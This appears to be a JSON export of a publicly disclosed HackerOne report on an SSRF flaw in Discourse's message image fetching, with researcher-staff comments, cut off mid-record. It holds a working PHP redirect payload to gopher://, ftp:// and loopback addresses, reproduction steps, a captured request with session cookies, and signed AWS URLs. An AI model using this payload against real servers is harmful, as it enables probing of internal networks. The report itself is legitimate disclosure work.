{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2017-05-19T21:55:49.135Z", 
    "voters": [
        "bl4de", 
        "secator", 
        "spam404", 
        "reactors08", 
        "bogdantcaciuc", 
        "malcolmx", 
        "eveeez", 
        "gamliel", 
        "axolotl", 
        "dz_samir", 
        "and 14 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "64.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 228377, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "vulnerability_information": "-Short description\n\nPrivate message function is vulnerable is vulnerable to a SSRF vulnerability which allows an attacker to craft connections originating from  servers to any destination on the internet and discourse internal network and craft outgoing UDP-packet (for example, to connect to  FTP  servers from discourse).\nread more at:\nhttps://cwe.mitre.org/data/definitions/918.html\n\n1. Load http://try.discourse.org\n2. Go to new message composer\n3. Set the receiver, topic \n4 set the message content\nTEST  [![](http://192.166.218.53/malicious3.php)](http://192.166.218.53/malicious3.php)\n\n5. Set the malicious3.php file on your remote server to:\n\n<?php\n        header('Location: gopher://192.166.218.53:80/test123');\n?>\n\n6. Send the private message.\n\n7. Check your remote server, in my case \"192.166.218.53\" web logs file (access.log)\nOUTPUT :\n\n64.71.168.198 - - [14/May/2017:16:38:04 -0400] \"HEAD /malicious3.php HTTP/1.1\" 302 187 \"-\" \"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36\"\n64.71.168.198 - - [14/May/2017:16:38:04 -0400] \"GET /malicious3.php HTTP/1.1\" 302 225 \"-\" \"Ruby\"\n64.71.168.198 - - [14/May/2017:16:38:04 -0400] \"HEAD /test123 HTTP/1.1\" 404 140 \"-\" \"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36\"\n\n-------------------------------------------------------------------------------------\n\n-  Request for FTP connection\n1. Load http://try.discourse.org\n2. Go to new message composer\n3. Set the receiver, topic\n4. set the message content\nTESTs  [![](http://192.166.218.53/malicious3.php)](http://192.166.218.53/malicious3.php)\n\n5. Set the malicious3.php file on your remote server to:\n\n<?php\n        header('Location: ftp://192.166.218.53/');\n?>\n\n6. Send the private message.\n\n7. Check your remote server, in my case \"192.166.218.53\" ftp  logs file. (vsftp.log).\nOUTPUT :\nSun May 14 15:29:40 2017 [pid 18354] CONNECT: Client \"::ffff:64.71.168.198\"\n\n-------------------------------------------------------------------------------------\n- Here is the burp suite request:\n\nPOST /posts HTTP/1.1\nHost: try.discourse.org\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nX-CSRF-Token: 1QJrm4k6xUHhUyhoEJUElbbSVsufYPnbQd8N+Jti7/TtHEJxOpfDairKu0ufS/ovBIWt/mtdISC36Tx8OMdD/w==\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nDiscourse-Visible: true\nX-Requested-With: XMLHttpRequest\nReferer: https://try.discourse.org/t/adsadas/835/7\nContent-Length: 437\nCookie: __utma=228756441.806995719.1494765035.1494768541.1494792827.3; __utmc=228756441; __utmz=228756441.1494765035.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _forum_session=V29LcnpQVXRTdWJ5dUdkWXQxOEhRRXFHRk5vbmtMS2lhRHdqVXdsYjRpUzhpQ2I1OHBLZVFZVFJqUXFtTUZXM0p0MTJwNWh0M3k3Y0R0NDl0VFBjR3hBQkZZMUlMbno5eTQvOEZtZkdjTFNzTVBNL1R1SDRua1BVMWtpTURyWXR3bnNGeWFPb1pBQnFpQW1ORFllNG04bWthUkFVZ01YTm9PWVB2dS96bmUybXkxU1ZaS2c1WkVlbExwK0pRMjlvaGF6WWY5bi9WeGlrd2xFNmtUYWhUaE01OHVRT05acFJWV3AyQXhUQ1U4YVpVZDV6UVFjSDBtc2NJa3R6dE1aeDVnaE9BblBKK0J4QVlKdGMxQmtYSTNZaGlJL1NFL3lma2pRVktIZWROazZnMTlmbXpSRDFTeVRWeHMveS9HckYxQXdjZ2dZQjdIVmV3aW4reUgzYjNwUWJ2YXVYY0Z4cWlrL2dzeXBmUGoxZVdhQ0JBTTFKZlB3SWhiZ24yZHZkVGYzYVJFb3lJZEhVTENxbHc1WWN1eDdrVGlVTHNLMTZEMG12WTJnVVNQRVhkWEhoTU1EUDNyQVZUdklkdmQwSlNhSlZVcXhQL3FFSzRqWmRyeFozV3BxRWtrK3FuZzBsWnlXVmVJeFVxNTBOMk5YVnR4d21kTXlIaEtlakp3aEJPZURoNm11Uy83d3l6U09kZnNrNnNiUEJBSjRQT0xXdWtqdlUxak5LK2MyaW1kbUlSRGtjWWo5eWJZT21OMk9ScmNFd1o2OG4xUTNIV0ZoVHJlVTFFSUlxKy9RbmZERDRtQ1dKaDVtSFBEeFZXMTNsOEcrMG13Vzc3c1R3R2hJMUdNOHJHT0lHRU93U20waG5pajhRQTZVNmhGT0tVTmNZa1d6TW5HSVg3c2pvTUkrNjhNZFpwRHVyalFVSWVWa0ktLTdpcUxTWCs5dEhsVHRFekRDQ3FLUHc9PQ%3D%3D--3bf9351bc59d99d10f831dcc1e647054ddef3c41; __utmb=228756441.9.10.1494792827; _t=aebe2511952a805cec46af434b6617d5\nConnection: close\n\nraw=TESTa+%5B!%5B%5D(http%3A%2F%2F192.166.218.53%2Fmalicious3.php)%5D(http%3A%2F%2F192.166.218.53%2Fmalicious3.php)&unlist_topic=false&category=&topic_id=835&is_warning=false&archetype=regular&typing_duration_msecs=100&composer_open_duration_msecs=9183&featured_link=&image_sizes%5Bhttp%3A%2F%2F192.166.218.53%2Fmalicious3.php%5D%5Bwidth%5D=24&image_sizes%5Bhttp%3A%2F%2F192.166.218.53%2Fmalicious3.php%5D%5Bheight%5D=24&nested_post=true\n\n-------------------------------------------------------------------------------------\n\nThe attacker is able to send internal server side requests using Ruby client.\nCheck the attached screens for prove.\n\nWhy does the vulnerability exist?\n\ndiscourse.org does not properly validate user input and does not configure ruby client properly which allows an attacker to use various  protocol wrappers other than http(s). For example, an attacker can supply ftp://test.com/file as an URL and discourse will make such a FTP request.\n\nIf the description is not clear please feel free to ask us for more detailed report.\n\nregards www.afine.pl\n\n", 
    "activity_page_count": 1, 
    "severity": {
        "rating": "low", 
        "author_type": "Team"
    }, 
    "title": "SSRF in upload IMG through URL", 
    "is_member_of_team?": null, 
    "vote_count": 24, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_view?": true, 
            "can_edit?": false, 
            "id": 4097, 
            "content": "The discourse.org upload function through URL in message content was vulnerable to Server side request forgery. Attacker was able to send internal / external requests using 2 different  client used by discourse.org including Ruby client. As an example we showed requests to ftp:// resources. I consider the vulnerability more risky then discourse.org team because the remote users should not be allow to send internal server side requests.", 
            "content_html": "<p>The discourse.org upload function through URL in message content was vulnerable to Server side request forgery. Attacker was able to send internal / external requests using 2 different  client used by discourse.org including Ruby client. As an example we showed requests to ftp:// resources. I consider the vulnerability more risky then discourse.org team because the remote users should not be allow to send internal server side requests.</p>\n"
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2017-06-18T21:55:49.188Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "activity_page_number": 1, 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$64", 
    "attachments": [
        {
            "file_name": "ftp_request.png", 
            "type": "image/png", 
            "id": 184573, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/184/573/c43f6bdb5805d4b5258d62b35b6f6fa8ce09b814/ftp_request.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSGAJTS7X%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223659Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDNv1JJkb2JCBJezLRSK3A3HLsRbM1N2dJQCs3cdkO9DdSlu97QyvuTWjB9TDM0zF0K5xYiGpDCZFKPrax%2BsFz5KI1WenrJdfAQhjK2VjV8ng750HOo6R9QtyoSkXqJSITk3z0sX6u%2BaGuR53DR1SgrXgU4%2BZj3kzVsOKKtd61G%2BDZP2N3q%2FR9lSxtCBWOIkOltAHyGZcqelOD%2BNHIXr08GPe3urs8MfpCWN12Uc98ELvbzHllGEdfFgQzzzB%2Fh03QvsfmUHldJCz%2F09ZO2mOXeVGvvhGa6P439ow0kmfHorCf2l49cQlp550RAVCceslQNRsIpjs%2FscvNzwUdv1wSWwe0IojrRDLG4nQFwiQ1K3a1GlpxXYzTv176jcnZhJdyzHXn0aNVd3n2yu6QXF1RyrednAqH6GTeLsY%2BmFdJvs1E%2FSPzNOEj5naR190ChZbKYdPEncIwhYy7S7R055CIUnAzUObhGpKBIz%2FL7hX57SOAVB8Fp6J9NWYxxkcT1Ux5M8TRdPzjlD4gsEW3VAWt2ylLrHUu11rkw%2BhgkA7Cbe4vsOk6sYBm%2BDSV9vvQVz42kWGtRMos%2BFMKzKt4FX3akfBm1nwEgIo656m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b609fdc12303bfca2ea4402d0a963c79bac04e7ae8e286183b65abd6bac07058"
        }, 
        {
            "file_name": "gopher.png", 
            "type": "image/png", 
            "id": 184574, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/184/574/bd48729b1970aa5c96ca7a6744ca0fa18a8eda36/gopher.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSGAJTS7X%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223659Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDNv1JJkb2JCBJezLRSK3A3HLsRbM1N2dJQCs3cdkO9DdSlu97QyvuTWjB9TDM0zF0K5xYiGpDCZFKPrax%2BsFz5KI1WenrJdfAQhjK2VjV8ng750HOo6R9QtyoSkXqJSITk3z0sX6u%2BaGuR53DR1SgrXgU4%2BZj3kzVsOKKtd61G%2BDZP2N3q%2FR9lSxtCBWOIkOltAHyGZcqelOD%2BNHIXr08GPe3urs8MfpCWN12Uc98ELvbzHllGEdfFgQzzzB%2Fh03QvsfmUHldJCz%2F09ZO2mOXeVGvvhGa6P439ow0kmfHorCf2l49cQlp550RAVCceslQNRsIpjs%2FscvNzwUdv1wSWwe0IojrRDLG4nQFwiQ1K3a1GlpxXYzTv176jcnZhJdyzHXn0aNVd3n2yu6QXF1RyrednAqH6GTeLsY%2BmFdJvs1E%2FSPzNOEj5naR190ChZbKYdPEncIwhYy7S7R055CIUnAzUObhGpKBIz%2FL7hX57SOAVB8Fp6J9NWYxxkcT1Ux5M8TRdPzjlD4gsEW3VAWt2ylLrHUu11rkw%2BhgkA7Cbe4vsOk6sYBm%2BDSV9vvQVz42kWGtRMos%2BFMKzKt4FX3akfBm1nwEgIo656m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7b0d4f9226ffc8d4f4ccc0dd214e8b5adce984096f6e37a6f05b2da998d57c4f"
        }, 
        {
            "file_name": "request.png", 
            "type": "image/png", 
            "id": 184575, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/184/575/77adf593d846d52ad02127afc6718aa17db458b3/request.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSGAJTS7X%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223659Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDNv1JJkb2JCBJezLRSK3A3HLsRbM1N2dJQCs3cdkO9DdSlu97QyvuTWjB9TDM0zF0K5xYiGpDCZFKPrax%2BsFz5KI1WenrJdfAQhjK2VjV8ng750HOo6R9QtyoSkXqJSITk3z0sX6u%2BaGuR53DR1SgrXgU4%2BZj3kzVsOKKtd61G%2BDZP2N3q%2FR9lSxtCBWOIkOltAHyGZcqelOD%2BNHIXr08GPe3urs8MfpCWN12Uc98ELvbzHllGEdfFgQzzzB%2Fh03QvsfmUHldJCz%2F09ZO2mOXeVGvvhGa6P439ow0kmfHorCf2l49cQlp550RAVCceslQNRsIpjs%2FscvNzwUdv1wSWwe0IojrRDLG4nQFwiQ1K3a1GlpxXYzTv176jcnZhJdyzHXn0aNVd3n2yu6QXF1RyrednAqH6GTeLsY%2BmFdJvs1E%2FSPzNOEj5naR190ChZbKYdPEncIwhYy7S7R055CIUnAzUObhGpKBIz%2FL7hX57SOAVB8Fp6J9NWYxxkcT1Ux5M8TRdPzjlD4gsEW3VAWt2ylLrHUu11rkw%2BhgkA7Cbe4vsOk6sYBm%2BDSV9vvQVz42kWGtRMos%2BFMKzKt4FX3akfBm1nwEgIo656m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=84ca98bed572f22648de6f1320d48df19c5cceb1280e0f9b5ce24c14fae0252c"
        }, 
        {
            "file_name": "request_output.png", 
            "type": "image/png", 
            "id": 184576, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/184/576/0b8f08f7896e30cab5bbeaa8c3f9db9feab30a0d/request_output.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSGAJTS7X%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223659Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDNv1JJkb2JCBJezLRSK3A3HLsRbM1N2dJQCs3cdkO9DdSlu97QyvuTWjB9TDM0zF0K5xYiGpDCZFKPrax%2BsFz5KI1WenrJdfAQhjK2VjV8ng750HOo6R9QtyoSkXqJSITk3z0sX6u%2BaGuR53DR1SgrXgU4%2BZj3kzVsOKKtd61G%2BDZP2N3q%2FR9lSxtCBWOIkOltAHyGZcqelOD%2BNHIXr08GPe3urs8MfpCWN12Uc98ELvbzHllGEdfFgQzzzB%2Fh03QvsfmUHldJCz%2F09ZO2mOXeVGvvhGa6P439ow0kmfHorCf2l49cQlp550RAVCceslQNRsIpjs%2FscvNzwUdv1wSWwe0IojrRDLG4nQFwiQ1K3a1GlpxXYzTv176jcnZhJdyzHXn0aNVd3n2yu6QXF1RyrednAqH6GTeLsY%2BmFdJvs1E%2FSPzNOEj5naR190ChZbKYdPEncIwhYy7S7R055CIUnAzUObhGpKBIz%2FL7hX57SOAVB8Fp6J9NWYxxkcT1Ux5M8TRdPzjlD4gsEW3VAWt2ylLrHUu11rkw%2BhgkA7Cbe4vsOk6sYBm%2BDSV9vvQVz42kWGtRMos%2BFMKzKt4FX3akfBm1nwEgIo656m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=651fe2f7982cff97e9336707c00e89e7e7a83ad64e333ba1d2ef8e594a958676"
        }
    ], 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2017-05-14T21:07:41.559Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-14T21:07:41.559Z", 
            "actor": {
                "username": "afine-team", 
                "url": "/afine-team", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/154/398/59c443251ca104fa72a94b280e80888347515149_medium.png?1490796800"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "As i noticed some of the numeric just messed, if it is not clearly then just tell me so i will rewrite the whole report.", 
            "markdown_message": "<p>As i noticed some of the numeric just messed, if it is not clearly then just tell me so i will rewrite the whole report.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1673259, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-16T10:59:50.770Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-16T10:59:50.770Z", 
            "actor": {
                "username": "asuka", 
                "url": "/asuka", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/111/923/c73a42c0f9ea47ce5554fbab2411978f2bb985f8_medium.jpg?1474068574"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "Apologies for the delay @marpo. We're looking into this and will get back to you shortly.", 
            "markdown_message": "<p>Apologies for the delay <a href=\"/marpo\">@marpo</a>. We&#39;re looking into this and will get back to you shortly.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1676807, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-16T11:03:57.498Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-16T11:03:57.498Z", 
            "actor": {
                "username": "afine-team", 
                "url": "/afine-team", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/154/398/59c443251ca104fa72a94b280e80888347515149_medium.png?1490796800"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "No problem, waiting for response.", 
            "markdown_message": "<p>No problem, waiting for response.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1676816, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-16T16:24:50.071Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-16T16:24:50.071Z", 
            "actor": {
                "username": "mlitchfield", 
                "url": "/mlitchfield", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/748/280394c6f7fb9d7cc77647d9839f5ebdd534b7e1_medium.png?1440553412"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "duplicate_report_id": 228851
            }, 
            "team_handle": "discourse", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ExternalUserJoined", 
            "id": 1677664, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-18T09:05:11.686Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-18T09:05:11.686Z", 
            "actor": {
                "username": "discourse_team", 
                "url": "/discourse_team", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/130/970/76f3cfd34fef4a1016e28d7164ec35a6f2a7bbeb_medium.png?1534409795"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "So the issue is that the server is following redirects to weird protocols? I find this report very hard to read and understand.", 
            "markdown_message": "<p>So the issue is that the server is following redirects to weird protocols? I find this report very hard to read and understand.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1682626, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-18T09:24:06.368Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-18T09:24:06.368Z", 
            "actor": {
                "username": "afine-team", 
                "url": "/afine-team", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/154/398/59c443251ca104fa72a94b280e80888347515149_medium.png?1490796800"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "Hi,\n\nNot exactly but that is also the problem. The server follow redirect to other protocol and send request to different location, that allow attacker to send server side request forgery. The problem is similar to: https://hackerone.com/reports/115748 . The difference here is that discourse use ruby instead of java client. Do you have problems with reproduce the steps? more about SSRF can be read for example here:\n\nhttps://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/\n\n\"Server Side Request Forgery (SSRF) can be used to make requests to other internal resources which the web server has access to, but are not publicly facing. Such an example would be accessing instance metadata in Amazon EC2 and OpenStack instances (It is only an example). This service is only available to the server and not to the outside world.\"\n\nThe script should only look for image file and in case of response other then 200 or protocol other then http(s) the request should be blocked..", 
            "markdown_message": "<p>Hi,</p>\n\n<p>Not exactly but that is also the problem. The server follow redirect to other protocol and send request to different location, that allow attacker to send server side request forgery. The problem is similar to: <a title=\"https://hackerone.com/reports/115748\" href=\"https://hackerone.com/reports/115748\">https://hackerone.com/reports/115748</a> . The difference here is that discourse use ruby instead of java client. Do you have problems with reproduce the steps? more about SSRF can be read for example here:</p>\n\n<p><a title=\"https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/\" href=\"/redirect?signature=d36e97ee68a881cad0b22d916fbf6c2294c55f40&amp;url=https%3A%2F%2Fwww.acunetix.com%2Fblog%2Farticles%2Fserver-side-request-forgery-vulnerability%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>&quot;Server Side Request Forgery (SSRF) can be used to make requests to other internal resources which the web server has access to, but are not publicly facing. Such an example would be accessing instance metadata in Amazon EC2 and OpenStack instances (It is only an example). This service is only available to the server and not to the outside world.&quot;</p>\n\n<p>The script should only look for image file and in case of response other then 200 or protocol other then http(s) the request should be blocked..</p>\n", 
            "type": "Activities::Comment", 
            "id": 1682663, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-18T09:30:57.136Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-18T09:30:57.136Z", 
            "actor": {
                "username": "afine-team", 
                "url": "/afine-team", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/154/398/59c443251ca104fa72a94b280e80888347515149_medium.png?1490796800"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "Example:\n\nwhen we will put a evil image inside message content \n\nCONTENT:\n\"TESTa [![](http://192.166.218.53/malicious3.php)](http://192.166.218.53/malicious3.php)\"\n\nAfter submit the message and send it to the receiver the server trying to reach the malicious3.php file. The server did not block the server although it is not an image file. The evil malicious3.php file on remote server redirected the discourse server to other link and protocl\n\nContent of malicious3.php:\n<?php\nheader('Location: ftp://192.166.218.53/');\n?>\n\n\nThe server followed the request and send next request to remote server on protocol :22 which is ftp, i presented it on the screens. In case the attacker will exploit the vulnerability he can try to reach the internal server side protocols by redirecting server to internal resources:\n\n<?php\nheader('Location: ftp://0.0.0.0/');\n?> \n\nor\n\n<?php\nheader('Location: ftp://127.0.0.1/');\n?>\n\nThe future exploitation depands on server side resources. This type of vulnerability can be also use to bypass any type of policies.\n\nSorry for previous badly constructed report, i dont know why after submit all of the numbering  was messed.\n\n\nCheers afine.pl", 
            "markdown_message": "<p>Example:</p>\n\n<p>when we will put a evil image inside message content </p>\n\n<p>CONTENT:<br>\n&quot;TESTa <a href=\"/redirect?signature=65972a013a991377870d9b9bb1d192228dff8aa1&amp;url=http%3A%2F%2F192.166.218.53%2Fmalicious3.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>![](http://192.166.218.53/malicious3.php)</span><i class=\"icon-external-link\"></i></a>&quot;</p>\n\n<p>After submit the message and send it to the receiver the server trying to reach the malicious3.php file. The server did not block the server although it is not an image file. The evil malicious3.php file on remote server redirected the discourse server to other link and protocl</p>\n\n<p>Content of malicious3.php:<br>\n&lt;?php<br>\nheader(&#39;Location: <a title=\"ftp://192.166.218.53/&#39;\" href=\"/redirect?signature=d5be2c1ccbd2b883a0aeb938662c310771a4e0e5&amp;url=ftp%3A%2F%2F192.166.218.53%2F%27\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>ftp://192.166.218.53/&#39;</span><i class=\"icon-external-link\"></i></a>);<br>\n?&gt;</p>\n\n<p>The server followed the request and send next request to remote server on protocol :22 which is ftp, i presented it on the screens. In case the attacker will exploit the vulnerability he can try to reach the internal server side protocols by redirecting server to internal resources:</p>\n\n<p>&lt;?php<br>\nheader(&#39;Location: <a title=\"ftp://0.0.0.0/&#39;\" href=\"/redirect?signature=133c572a05d70f6b1de20d93d28960a09a954da9&amp;url=ftp%3A%2F%2F0.0.0.0%2F%27\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>ftp://0.0.0.0/&#39;</span><i class=\"icon-external-link\"></i></a>);<br>\n?&gt; </p>\n\n<p>or</p>\n\n<p>&lt;?php<br>\nheader(&#39;Location: <a title=\"ftp://127.0.0.1/&#39;\" href=\"/redirect?signature=d3b947d01037572f2c4da051721609792a909557&amp;url=ftp%3A%2F%2F127.0.0.1%2F%27\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>ftp://127.0.0.1/&#39;</span><i class=\"icon-external-link\"></i></a>);<br>\n?&gt;</p>\n\n<p>The future exploitation depands on server side resources. This type of vulnerability can be also use to bypass any type of policies.</p>\n\n<p>Sorry for previous badly constructed report, i dont know why after submit all of the numbering  was messed.</p>\n\n<p>Cheers afine.pl</p>\n", 
            "type": "Activities::Comment", 
            "id": 1682678, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-18T23:04:26.151Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-18T23:04:26.151Z", 
            "actor": {
                "username": "discourse_team", 
                "url": "/discourse_team", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/130/970/76f3cfd34fef4a1016e28d7164ec35a6f2a7bbeb_medium.png?1534409795"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "@asuka I do not find the other report easier to follow.\n\nSo the issue is this?\n\n1. Write a post with a link in it.\n2. We attempt to onebox the link which means we need to get opengraph tags. So we make a HTTP request to the target URL.\n3. The target URL issues a redirect USING A DIFFERENT PROTOCOL, e.g. \"redirect to FTP://1.2.3.4\"\n4. We follow that redirect, which means our server makes a FTP request to our own servers (assuming we operate the server at 1.2.3.4)\n\nSo the issue is redirects not disallowing any protocol other than HTTP?", 
            "markdown_message": "<p><a href=\"/asuka\">@asuka</a> I do not find the other report easier to follow.</p>\n\n<p>So the issue is this?</p>\n\n<ol>\n<li>Write a post with a link in it.</li>\n<li>We attempt to onebox the link which means we need to get opengraph tags. So we make a HTTP request to the target URL.</li>\n<li>The target URL issues a redirect USING A DIFFERENT PROTOCOL, e.g. &quot;redirect to <a title=\"ftp://1.2.3.4\" href=\"/redirect?signature=28eb15e06d836a41dbb5f089d9a89ab9ee7fcedd&amp;url=ftp%3A%2F%2F1.2.3.4\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>ftp://1.2.3.4</span><i class=\"icon-external-link\"></i></a>&quot;</li>\n<li>We follow that redirect, which means our server makes a FTP request to our own servers (assuming we operate the server at 1.2.3.4)</li>\n</ol>\n\n<p>So the issue is redirects not disallowing any protocol other than HTTP?</p>\n", 
            "type": "Activities::Comment", 
            "id": 1684794, 
            "genius_execution_id": null
        }, 
        {
            "attachments": [
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/185/935/d59e02aa2f3d69d00d136a902121d9d1170197cb/vulnerable_function.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSGAJTS7X%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223700Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDNv1JJkb2JCBJezLRSK3A3HLsRbM1N2dJQCs3cdkO9DdSlu97QyvuTWjB9TDM0zF0K5xYiGpDCZFKPrax%2BsFz5KI1WenrJdfAQhjK2VjV8ng750HOo6R9QtyoSkXqJSITk3z0sX6u%2BaGuR53DR1SgrXgU4%2BZj3kzVsOKKtd61G%2BDZP2N3q%2FR9lSxtCBWOIkOltAHyGZcqelOD%2BNHIXr08GPe3urs8MfpCWN12Uc98ELvbzHllGEdfFgQzzzB%2Fh03QvsfmUHldJCz%2F09ZO2mOXeVGvvhGa6P439ow0kmfHorCf2l49cQlp550RAVCceslQNRsIpjs%2FscvNzwUdv1wSWwe0IojrRDLG4nQFwiQ1K3a1GlpxXYzTv176jcnZhJdyzHXn0aNVd3n2yu6QXF1RyrednAqH6GTeLsY%2BmFdJvs1E%2FSPzNOEj5naR190ChZbKYdPEncIwhYy7S7R055CIUnAzUObhGpKBIz%2FL7hX57SOAVB8Fp6J9NWYxxkcT1Ux5M8TRdPzjlD4gsEW3VAWt2ylLrHUu11rkw%2BhgkA7Cbe4vsOk6sYBm%2BDSV9vvQVz42kWGtRMos%2BFMKzKt4FX3akfBm1nwEgIo656m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=55dca5e59bc21c1aa705620743eec7152cac3cb913686991bc1cda441347c1a0", 
